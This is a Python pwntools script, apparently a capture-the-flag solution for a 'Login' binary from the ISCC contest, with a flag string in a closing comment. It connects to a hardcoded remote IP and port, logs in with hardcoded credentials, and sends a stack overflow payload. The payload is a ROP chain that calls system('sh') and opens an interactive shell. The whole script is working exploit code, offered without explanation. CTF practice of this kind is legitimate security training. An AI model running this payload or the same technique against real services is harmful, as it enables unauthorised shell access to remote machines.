from pwn import *

DEBUG = 0
context.arch = 'amd64'

if DEBUG:
    sh = process('./Login')
    context.log_level = 'debug'
    context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
else:
    sh = remote('47.104.16.75', 9000)

sh.sendlineafter('username:', 'admin')
sh.sendlineafter('password:', 'T6OBSh2i')

offset = 0x58
sh_addr = 0x400407
system_plt = ELF('./Login').plt['system']


payload = flat(['a' * offset, 0x400b03, sh_addr, system_plt, 0x400BEF])
sh.sendlineafter('choice:', payload)
sh.sendlineafter('choice:', '3')

sh.interactive()

# flag{welcome_to_iscc}
